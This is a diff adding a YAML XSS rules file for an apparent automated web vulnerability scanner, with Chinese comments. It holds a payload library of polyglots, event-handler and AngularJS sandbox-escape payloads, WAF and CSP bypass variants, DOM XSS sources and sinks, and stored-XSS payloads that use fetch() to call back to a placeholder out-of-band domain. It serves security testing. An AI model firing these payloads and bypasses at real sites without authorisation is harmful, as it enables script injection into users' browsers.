@@ -1,0 +1,214 @@
+# knowledge/rules/xss_rules.yaml
+# SAM-∞ v28-Ω  Cross-Site Scripting (XSS) Detection Rules
+# ──────────────────────────────────────────────────────────────────────────────
+
+meta:
+  vuln_type: xss
+  version: "1.0.0"
+  last_updated: "2026-10-27"
+  description: "XSS 检测规则集：反射型、存储型、DOM 型；CSP bypass；OAST HTTP 回调验证"
+
+default_oracle_pattern: ""
+
+# ── Oracle 验证模式 ────────────────────────────────────────────────────────────
+oracle_patterns:
+  reflection:
+    # 响应中必须包含未被过滤的 payload 特征字符串
+    - "<script>"
+    - "javascript:"
+    - "onerror="
+    - "onload="
+    - "alert("
+    - "confirm("
+    - "prompt("
+  oast_callback:
+    # 存储型 XSS：OAST HTTP 回调确认执行
+    description: "fetch()/XHR 发送 OAST HTTP 请求，服务端收到即为存在"
+
+# ── Polyglot payload 库（多场景通用）────────────────────────────────────────────
+payloads:
+  # ── Polyglot（优先使用，覆盖多种注入上下文）──────────────────────────────────
+  - payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
+    category: polyglot
+    context: universal
+    confidence: 0.90
+
+  - payload: "'\"><img src=x onerror=alert(1)>"
+    category: html_injection
+    context: html_attribute
+    confidence: 0.88
+
+  - payload: "<svg onload=alert(1)>"
+    category: svg
+    context: html_body
+    confidence: 0.87
+
+  - payload: "<script>alert(1)</script>"
+    category: script_tag
+    context: html_body
+    confidence: 0.85
+
+  - payload: "\"><script>alert(1)</script>"
+    category: attribute_breakout
+    context: html_attribute
+    confidence: 0.85
+
+  - payload: "';alert(1)//"
+    category: js_context
+    context: javascript_string
+    confidence: 0.83
+
+  - payload: "</script><script>alert(1)</script>"
+    category: script_breakout
+    context: script_block
+    confidence: 0.83
+
+  # ── HTML 实体绕过 ──────────────────────────────────────────────────────────
+  - payload: "&lt;script&gt;alert(1)&lt;/script&gt;"
+    category: entity_encoded
+    context: double_decoded
+    confidence: 0.70
+    note: "双重解码场景"
+
+  - payload: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+    category: hex_entity
+    context: double_decoded
+    confidence: 0.70
+
+  # ── JavaScript 上下文 ──────────────────────────────────────────────────────
+  - payload: "\"-alert(1)-\""
+    category: js_context
+    context: javascript_string_double
+    confidence: 0.82
+
+  - payload: "`${alert(1)}`"
+    category: template_literal
+    context: javascript_template
+    confidence: 0.80
+
+  - payload: "}}alert(1)//"
+    category: angular_template
+    context: angularjs
+    confidence: 0.78
+
+  - payload: "{{constructor.constructor('alert(1)')()}}"
+    category: angular_sandbox_bypass
+    context: angularjs_1x
+    confidence: 0.75
+
+  # ── 事件处理器 ─────────────────────────────────────────────────────────────
+  - payload: "<img src=x onerror=alert(1)>"
+    category: event_handler
+    context: html_body
+    confidence: 0.87
+
+  - payload: "<body onload=alert(1)>"
+    category: event_handler
+    context: html_body
+    confidence: 0.85
+
+  - payload: "<input onfocus=alert(1) autofocus>"
+    category: event_handler
+    context: form
+    confidence: 0.82
+
+  - payload: "<select onfocus=alert(1) autofocus>"
+    category: event_handler
+    context: form
+    confidence: 0.80
+
+  - payload: "<textarea onfocus=alert(1) autofocus>"
+    category: event_handler
+    context: form
+    confidence: 0.80
+
+  # ── OAST HTTP 回调（存储型 XSS 验证）────────────────────────────────────────
+  - payload: "<script>fetch('http://{oast_domain}/{correlation_id}')</script>"
+    category: oast_callback
+    context: stored_xss
+    oracle_type: oast_http
+    confidence: 0.92
+    note: "存储型 XSS 专用；需替换 oast_domain 和 correlation_id"
+
+  - payload: "<img src=x onerror=\"fetch('http://{oast_domain}/{correlation_id}')\"/>"
+    category: oast_callback
+    context: stored_xss
+    oracle_type: oast_http
+    confidence: 0.90
+
+  - payload: "<svg onload=\"new Image().src='http://{oast_domain}/{correlation_id}'\">"
+    category: oast_callback
+    context: stored_xss
+    oracle_type: oast_http
+    confidence: 0.88
+
+# ── WAF Bypass 变体 ────────────────────────────────────────────────────────────
+waf_bypass:
+  # 标签混淆
+  tag_obfuscation:
+    - "<ScRiPt>alert(1)</sCrIpT>"
+    - "<SCRIPT>alert(1)</SCRIPT>"
+    - "<%00script>alert(1)</%00script>"
+
+  # 空字节注入
+  null_byte:
+    - "<scr\x00ipt>alert(1)</scr\x00ipt>"
+    - "<scr%00ipt>alert(1)</scr%00ipt>"
+
+  # 编码绕过
+  encoding:
+    - "<script>eval(atob('YWxlcnQoMSk='))</script>"   # base64: alert(1)
+    - "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
+
+  # cloudflare 专用
+  cloudflare:
+    - "<svg/onload=alert(1)>"
+    - "<svg\tonload=alert(1)>"
+    - "<svg\nonload=alert(1)>"
+    - "\">'><details/open/ontoggle=alert(1)>"
+
+  # 无括号 alert（绕过括号过滤）
+  no_parentheses:
+    - "<img src=x onerror=alert`1`>"
+    - "<script>alert`1`</script>"
+    - "<img src=x onerror=\"window['ale'+'rt'](1)\">"
+
+  # CSP bypass（JSONP / open redirect）
+  csp_bypass:
+    - "<script src=//cdn.example.com/jsonp?callback=alert></script>"
+    - "<script>location='javascript:alert(1)'</script>"
+  csp_bypass_note: "CSP bypass 需要具体分析目标的 CSP 策略"
+
+# ── DOM XSS Sources & Sinks ────────────────────────────────────────────────────
+dom_xss:
+  sources:
+    - "location.hash"
+    - "location.search"
+    - "document.referrer"
+    - "window.name"
+    - "document.URL"
+    - "document.documentURI"
+
+  sinks:
+    - "document.write()"
+    - "document.writeln()"
+    - "innerHTML"
+    - "outerHTML"
+    - "insertAdjacentHTML()"
+    - "eval()"
+    - "setTimeout()"
+    - "setInterval()"
+    - "location.href"
+    - "location.assign()"
+    - "location.replace()"
+    - "$.html()"
+    - "$()"  # jQuery selector injection
+
+  dom_payloads:
+    - "#<img src=x onerror=alert(1)>"       # location.hash
+    - "?q=<img src=x onerror=alert(1)>"    # URL 参数
+    - "#javascript:alert(1)"               # hash + javascript:
+
+distilled_rules: []
+total_distilled_rules: 0
+last_updated: "2026-10-27"
